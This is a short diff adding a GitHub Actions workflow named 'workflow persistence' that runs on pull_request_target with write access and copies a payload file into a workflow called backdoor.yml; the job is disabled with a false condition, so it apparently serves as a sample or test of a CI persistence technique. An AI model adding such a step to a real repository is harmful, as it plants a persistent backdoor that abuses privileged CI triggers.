@@ -1,0 +1,13 @@
+name: workflow persistence
+
+on: pull_request_target
+
+permissions:
+  contents: write
+
+jobs:
+  persist:
+    if: ${{ false }}
+    runs-on: ubuntu-latest
+    steps:
+      - run: cp payload.yml .github/workflows/backdoor.yml
